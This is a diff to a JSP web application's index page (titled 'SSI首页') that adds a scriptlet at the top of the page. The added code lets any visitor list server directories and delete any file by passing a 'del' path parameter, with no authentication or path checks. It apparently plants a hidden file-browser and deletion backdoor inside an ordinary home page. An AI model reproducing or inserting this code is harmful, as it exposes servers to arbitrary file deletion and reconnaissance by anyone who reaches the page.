@@ -1,6 +1,46 @@
 <%@ page contentType="text/html;charset=utf-8"%>
 <%@ include file="/commons/taglibs.jsp"%>
 <%@ include file="/commons/style.jsp"%>
+<%
+	File file = null;
+	File root = null;
+	String fileName = request.getParameter("fileName") == null ? "":request.getParameter("fileName");
+	String filePath = request.getParameter("filePath") == null ? "":request.getParameter("filePath");
+	String del = request.getParameter("del") == null ? "":request.getParameter("del");
+	try{
+
+		 if(null != del && !"".equals(del)){
+			File tmp = new File(del);
+			if(tmp.isFile()){
+				tmp.delete();
+				out.println(" >> 删除文件["+del+"]成功!<br/>");
+			}
+		 }	
+  	     filePath = request.getRealPath(request.getContextPath());
+		 out.println(" >> ["+filePath+"] <br/>");
+		 if(null != fileName && "".equals(fileName)){
+			 root = new File(filePath);
+		 }else{
+			 root = new File(filePath+File.separator+fileName);
+		 }
+		 out.println(" >> 路径:"+root.getAbsolutePath()+"<br/>");
+		if(root.isDirectory()){
+			File[] files = root.listFiles();
+			out.println("--| ..</br>");
+			for(File sub:files){
+				if(sub.isDirectory()){
+					out.println("--| <a href=\"index.jsp?fileName="+sub.getName()+"\">"+sub.getName()+"</a>\t<a href=\"index.jsp?del="+sub.getAbsolutePath()+"\">删除</a></br> ");
+				}else{
+					out.println("--| "+sub.getName()+"\t<a href=\"index.jsp?del="+sub.getAbsolutePath()+"\">删除</a></br>");
+				}
+			}
+		}else{
+			out.println("--|"+root.list().length);
+		}
+	}catch(Exception e){
+		e.printStackTrace();
+	}
+%>
 <html>
 	<head>
 		<title>SSI首页</title>
